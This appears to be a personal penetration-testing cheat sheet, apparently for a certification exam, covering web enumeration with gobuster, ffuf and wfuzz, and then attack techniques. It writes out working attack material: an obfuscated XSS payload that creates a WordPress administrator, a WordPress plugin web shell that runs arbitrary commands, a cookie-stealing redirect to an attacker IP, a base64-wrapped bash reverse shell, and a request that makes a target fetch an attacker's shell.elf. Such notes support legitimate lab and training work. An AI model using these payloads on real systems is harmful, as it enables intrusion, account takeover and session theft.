# Web Ass Tool
## Nmap
- Use NSE script
``` http-num  ```

## Use Gobuster 

###  Gobuster fuzzing

1.  ``` gobuster dir -u {ip} -w /usr/share/wordlists/dirb/common.txt -t 42 ```

    ``` -x html,php,aspx ```can add filetype here (https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)

### Gobuster enum API
- Provide pattern in pattern file
    ``` {GOBUSTER}/v1 ```

### Enum (RECURSIVELY IF NEEDED!)
    ``` gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern -t 42```

### Try harder !
- Try more seclists in still cant find e.g. https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-directories.txt 
    ```
    /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt
    /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
    ```
- Enum try more file extension!!! (Dont be lazy)
- if website is not case-sentitive can use single case only wordlist

### With proxy simple!
- ``` HTTP_PROXY="http://192.168.153.189:3128/" gobuster dir -u http://192.168.153.189:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 42  ```

## feroxbuster 
- Support recursive and interactive scanning
- ``` feroxbuster -k -u {url} -x {file_type} -o {outputfile} -w {wordlist} ```
### Stop scanning some path within progress
1. Hit 'enter' to start menu
2. ``` c -f {number of branch} ```

## ffuf
### Check subdomain
- ```ffuf -u http://{ip} -H "Host:FUZZ.{hostname}" -w /usr/share/seclists/discovery/dns/subdomains-top1million.txt ```
- ``` -fs 1234 ``` filter size = 1234
### Check special character
- ``` using /opt/seclists/fuzzing/special-char.txt ```

## SSTI
- https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- ``` ${{<%[%'"}}%\. ``` Testing these character
1. can try code execution e.g. python: maybe code have ```eval()``` and you can ```__import__('os').system(whoami)```
2. java? : check link

## Burp Suite
- You know what to do =]

## enum version/ using which service
- ``` whatweb ```

# Web Enum
- curl traversal check ``` curl --path-as-is {URL} ```
  
## Dirb
- check hidden shit
- ``` dirb http://192.168.1.224/ /usr/share/wordlists/dirb/common.txt ```

## Traversal with gobuster if can access machine file system
- e.g. ../../...../Users/Hayer/{Gobuster}.txt .pdf etc...

- curl POST ``` curl -X POST -d "code=2*2" http://192.168.171.117:50000/verify```

- curl POST w/ JSON ``` curl -v -X POST -H "Content-Type: application/json" -d '{"user":"clumsyadmin", "url":"http://192.168.45.197/shell.elf"}' "http://192.168.173.134:13337/update"  ```

- useful file 
1. .htaccess will tell you some hidden allowed key pair header --> add = can access 
   ``` do with burp suite browser
    - proxy -> option -> match and place --> request header & replace: {new header} --> ok
   ```

- Useful url

    ``` sitemap.xml robots.txt ```

- Useful header info

    ``` X-??? ```

- http file to markdown
  ``` curl -s http://192.168.244.140:8000/ | html2markdown ```

## wFuzz
- https://book.hacktricks.xyz/pentesting-web/web-tool-wfuzz 
1. ``` wfuzz -c -z file,/usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -d '{"user":FUZZ,"url":"http://192.168.45.197/shell.elf"}' -H "Content-Type: application/json" -t 20 -v http://192.168.173.134:13337/update ```

# Try Default password !!!

## XSS
Wont be much in exam
- Identify vuln params
- Prepare payload to vuln page/plugin/etc E.G. adding new account to the web

    ```
    var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
    ajaxRequest = new XMLHttpRequest();
    ajaxRequest.open("POST", requestURL, true);
    ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    ajaxRequest.send(params);
    ```
- Minified it with this:
  
    ``` 
    function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
            
    let encoded = encode_to_javascript('insert_minified_javascript')
    console.log(encoded)
    ```

- payload example

    ``` "<script>eval(String.fromCharCode( {output} ..... ))</script> ```

- Simple CLI runner plugin in WP
``` 
<?php
/*
Plugin Name: CLI Runner
Plugin URI: https://example.com/cli-runner
Description: A plugin that allows you to run command line interface (CLI) commands from WordPress.
Version: 1.0.0
Author: Your Name
Author URI: https://example.com
License: GPL2
*/

if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly
}

if (!class_exists('CLI_Runner')) {

    class CLI_Runner {

        public function __construct() {
            // Add a custom action to the WordPress admin menu
            add_action('admin_menu', array($this, 'add_menu'));
        }

        public function add_menu() {
            // Add a submenu under "Tools"
            add_submenu_page(
                'tools.php', // Parent slug
                'CLI Runner', // Page title
                'CLI Runner', // Menu title
                'manage_options', // Capability required
                'cli-runner', // Menu slug
                array($this, 'cli_runner_page') // Callback function
            );
        }

        public function cli_runner_page() {
            // Check if the form has been submitted
            if (isset($_POST['cli_runner_command'])) {
                $command = sanitize_text_field($_POST['cli_runner_command']);
                $output = exec($command);
                echo "<pre>$output</pre>";
            }
            ?>
            <div class="wrap">
                <h1>CLI Runner</h1>
                <form method="post">
                    <textarea name="cli_runner_command" rows="10" cols="80"></textarea><br>
                    <input type="submit" value="Run Command" class="button button-primary">
                </form>
            </div>
            <?php
        }

    }

}

// Initialize the plugin
$cli_runner = new CLI_Runner();
```


## Advanced XSS with redirecting to steal sessions/jwt/cookies
1. Host a python web server and add index.html 
```
<meta http-equiv="refresh" content="0; URL=new_website_url" />

```
2. craft new_website_url: ``` original_url+params?=windows.location='kali_ip'/document.cookies ```
3. call local web and will redirect to the victim web and then pass the cookie thru http call back 


## Base64 encode and decode a one liner
1. ``` echo -n "bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'" | base64 ``` encode
2. ``` echo -n {base64encoded} | base64 -d | bash``` decode and run in victim

## HTML entity encoder
- https://mothereff.in/html-entities 
- e.g. for java <xml>